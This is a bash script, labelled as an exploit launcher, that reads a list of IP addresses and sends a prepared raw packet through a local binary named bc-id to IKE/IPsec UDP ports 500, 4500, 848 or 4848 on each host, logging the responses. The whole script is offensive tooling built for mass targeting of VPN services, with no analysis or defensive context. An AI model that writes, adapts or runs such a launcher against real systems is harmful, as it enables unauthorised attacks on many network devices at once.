#!/bin/bash

function exploit
{

if [ -z "$1" ]; then
  echo "[*] please set a valid ip, ex: 8.8.8.8";
  exit 0;
fi

if [ -z "$2" ]; then
  echo "[*] please set a valid port, ex: 500, 4500"
fi

ip="$1"
port="$2"

timeout 6s ./bc-id -t $ip -p $port -I "sendpacket.raw" | tee -a "$ip.log"
}


# UDP port 500
# UDP port 4500, NAT Traversal (NAT-T)
# UDP port 848,  Group Domain of Interpretation (GDOI)
# UDP port 4848, GDOI NAT-T

function main
{
  echo "1) exploit port 500";
  echo "2) exploit port 4500";
  echo "3) exploit port 848";
  echo "4) exploit port 4848";

  read -p "[*] please make a choice: " choice
  read -p "[*] please set a valid iplist: " iplist

  for ip in $(cat $iplist); do
    case $choice in
        1) exploit $ip 500;;
        2) exploit $ip 4500;;
        3) exploit $ip 848;;
        4) exploit $ip 4848;;
    esac
  done
}


main
